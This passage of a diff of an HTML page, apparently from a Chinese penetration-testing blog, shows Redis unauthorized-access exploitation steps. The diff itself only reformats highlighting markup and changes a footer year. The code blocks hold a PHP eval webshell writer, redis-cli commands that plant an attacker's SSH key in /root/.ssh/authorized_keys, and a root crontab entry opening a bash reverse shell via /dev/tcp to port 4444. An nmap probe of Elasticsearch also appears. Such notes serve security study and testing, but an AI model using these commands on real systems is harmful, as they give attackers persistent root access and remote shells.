+</span></span><span class="line"><span class="cl"><span class="nx">fwrite</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span><span class="s1">&#39;&lt;?php @eval($_POST[1]);?&gt;&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">exit</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table>
 </div>
 </div><h4 id="写-ssh-公钥">写 ssh 公钥</h4>
 <div class="highlight"><div class="chroma">
@@ -939,14 +937,14 @@ save
 </span><span class="lnt">7
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">ssh-keygen -t rsa
-<span class="nb">cd</span> .ssh
-<span class="o">(</span><span class="nb">echo</span> -e <span class="s2">&#34;\n\n&#34;</span><span class="p">;</span> cat id_rsa.pub<span class="p">;</span> <span class="nb">echo</span> -e <span class="s2">&#34;\n\n&#34;</span><span class="o">)</span> &gt; 1.txt
-cat 1.txt <span class="p">|</span> redis-cli -h ip -x <span class="nb">set</span> payload
-config <span class="nb">set</span> dir /root/.ssh
-config <span class="nb">set</span> dbfilename authorized_keys
-save
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ssh-keygen -t rsa
+</span></span><span class="line"><span class="cl"><span class="nb">cd</span> .ssh
+</span></span><span class="line"><span class="cl"><span class="o">(</span><span class="nb">echo</span> -e <span class="s2">&#34;\n\n&#34;</span><span class="p">;</span> cat id_rsa.pub<span class="p">;</span> <span class="nb">echo</span> -e <span class="s2">&#34;\n\n&#34;</span><span class="o">)</span> &gt; 1.txt
+</span></span><span class="line"><span class="cl">cat 1.txt <span class="p">|</span> redis-cli -h ip -x <span class="nb">set</span> payload
+</span></span><span class="line"><span class="cl">config <span class="nb">set</span> dir /root/.ssh
+</span></span><span class="line"><span class="cl">config <span class="nb">set</span> dbfilename authorized_keys
+</span></span><span class="line"><span class="cl">save
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h4 id="写-crontab">写 crontab</h4>
 <div class="highlight"><div class="chroma">
@@ -958,12 +956,12 @@ save
 </span><span class="lnt">5
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">redis-cli -h 192.168.0.104
-<span class="nb">set</span> xxx <span class="s2">&#34;\n\n*/1 * * * * /bin/bash -i&gt;&amp;/dev/tcp/192.168.0.104/4444 0&gt;&amp;1\n\n&#34;</span>
-config <span class="nb">set</span> dir /var/spool/cron
-config <span class="nb">set</span> dbfilename root
-save
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">redis-cli -h 192.168.0.104
+</span></span><span class="line"><span class="cl"><span class="nb">set</span> xxx <span class="s2">&#34;\n\n*/1 * * * * /bin/bash -i&gt;&amp;/dev/tcp/192.168.0.104/4444 0&gt;&amp;1\n\n&#34;</span>
+</span></span><span class="line"><span class="cl">config <span class="nb">set</span> dir /var/spool/cron
+</span></span><span class="line"><span class="cl">config <span class="nb">set</span> dbfilename root
+</span></span><span class="line"><span class="cl">save
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h3 id="利用-redis-主从复制-rce">利用 redis 主从复制 rce</h3>
 <p><a href="https://geekby.xyz/2019/07/15/redis-ji-yu-zhu-cong-fu-zhi-de-rce-li-yong-fang-shi/" target="_blank" rel="noopener noreffer">https://geekby.xyz/2019/07/15/redis-ji-yu-zhu-cong-fu-zhi-de-rce-li-yong-fang-shi/</a></p>
@@ -989,8 +987,8 @@ save
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">nmap -sV -p 9200 IP
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">nmap -sV -p 9200 IP
+</span></span></code></pre></td></tr></table>
 </div>
 </div><ul>
 <li><a href="http://IP:9200/" target="_blank" rel="noopener noreffer">http://IP:9200/</a></li>
@@ -1038,7 +1036,7 @@ save
 </div>
 </article></div>
             </main><footer class="footer">
-        <div class="footer-container"><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2019 - 2021</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Geekby</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        <div class="footer-container"><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2019 - 2022</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Geekby</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
         </div>
     </footer></div>
 
